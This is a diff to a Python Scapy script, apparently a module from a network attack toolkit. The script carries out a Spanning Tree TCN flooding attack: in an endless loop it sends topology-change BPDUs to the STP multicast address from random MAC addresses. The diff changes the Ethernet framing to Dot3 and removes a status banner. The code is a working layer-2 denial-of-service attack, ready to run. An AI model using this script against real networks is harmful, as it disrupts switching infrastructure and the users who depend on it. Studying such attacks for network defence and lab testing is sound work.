@@ -2,11 +2,8 @@
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.WARNING)
 
-from scapy.layers.l2 import Ether, LLC, STP
+from scapy.layers.l2 import Dot3, LLC, STP
 from scapy.all import sendp, RandMAC
-from termcolor import colored
-import six
-
 
 
 def run(inter):
@@ -14,10 +11,9 @@ def run(inter):
     interface = str(inter[0])
     if len(interface) > 0:
         try:
-            six.print_(colored("[*]", "blue"), "Running STP TCN ATTACK...")
             while 1:
                 srcMAC = str(RandMAC())     # Random MAC in each iteration
-                p_ether = Ether(dst="01:80:c2:00:00:00", src=srcMAC)
+                p_ether = Dot3(dst="01:80:c2:00:00:00", src=srcMAC)
                 p_llc = LLC()
                 p_stp = STP(bpdutype=0x80)   # TCN packet
                 pkt = p_ether/p_llc/p_stp   # STP packet structure
@@ -30,3 +26,4 @@ def run(inter):
 
 def run_attack(config):
     run(config.interface)
+
